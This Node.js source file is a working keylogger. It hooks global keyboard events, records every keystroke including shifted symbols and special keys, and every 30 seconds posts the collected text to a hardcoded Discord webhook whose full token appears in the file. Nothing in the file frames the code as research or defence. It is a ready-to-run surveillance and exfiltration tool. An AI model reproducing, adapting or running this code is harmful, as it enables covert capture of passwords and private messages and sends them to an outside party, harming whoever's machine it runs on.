const { GlobalKeyboardListener } = require('node-global-key-listener');
const axios = require('axios');

const webhookUrl = 'https://discord.com/api/webhooks/1232523854291800075/JM1uR5wQEKuGraDA4TgL0XycQJgGS08lOBLqD7HtAA0aAD4N3uju59GR6-Swv8bGDigK';

const listener = new GlobalKeyboardListener();
let shiftPressed = false;
let keylogs = '';

listener.addListener(function (e, down) {
    if (down) {
        handleKeyDown(e);
    } else {
        handleKeyUp(e);
    }
});

function handleKeyDown(e) {
    if (e.state === 'DOWN') {
        if (e.name === 'LEFT SHIFT' || e.name === 'RIGHT SHIFT') {
            shiftPressed = true;
        }
    }
}

function handleKeyUp(e) {
    if (e.state === 'UP') {
        switch (e.name) {
            case 'TAB':
                process.stdout.write('<TAB>');
                keylogs += '<TAB>';
                break;
            case 'RETURN':
                process.stdout.write('<ENTER>');
                keylogs += '<ENTER>';
                break;
            case 'SPACE':
                process.stdout.write(' ');
                keylogs += ' ';
                break;
            case 'ESCAPE':
                process.stdout.write('<ESC>');
                keylogs += '<ESC>';
                break;
            case 'DELETE':
                process.stdout.write('<DEL>');
                keylogs += '<DEL>';
                break;
            case 'BACKSPACE':
                process.stdout.write('<B.SPACE>');
                keylogs += '<B.SPACE>';
                break;
            case 'LEFT ALT':
                process.stdout.write('</L.ALT>');
                keylogs += '</L.ALT>';
                break;
            case 'RIGHT ALT':
                process.stdout.write('</R.ALT>');
                keylogs += '</R.ALT>';
                break;
            default:
                let keyName = e.name;
                if (shiftPressed) {
                    // Convert key name to uppercase if shift is pressed
                    keyName = convertToUpperCase(keyName);
                }
                process.stdout.write(keyName);
                keylogs += keyName;
        }
    }
}

function convertToUpperCase(keyName) {
    switch (keyName) {
        case '1':
            return '!';
        case '2':
            return '@';
        case '3':
            return '#';
        case '4':
            return '$';
        case '5':
            return '%';
        case '6':
            return '^';
        case '7':
            return '&';
        case '8':
            return '*';
        case '9':
            return '(';
        case '0':
            return ')';
        case '-':
            return '_';
        case '=':
            return '+';
        case '`':
            return '~';
        case '[':
            return '{';
        case ']':
            return '}';
        case ';':
            return ':';
        case ',':
            return '<';
        case '.':
            return '>';
        case '/':
            return '?';

        default:
            // Convert to uppercase
            return keyName.toUpperCase();
    }
}

async function sendKeyLogs() {
    try {
        const response = await axios.post(webhookUrl, {
            "content": keylogs
        });
        console.log('Key logs sent successfully:', response.status);
        keylogs = ''; // Clear keylogs after successful post
    } catch (error) {
        console.error('Failed to send keylogs:', error.message);
        if (error.response) {
            console.error('Discord API responded with:', error.response.data);
        }
    }
}


// keylogger interval | 30s
setInterval(sendKeyLogs, 1000 * 30);
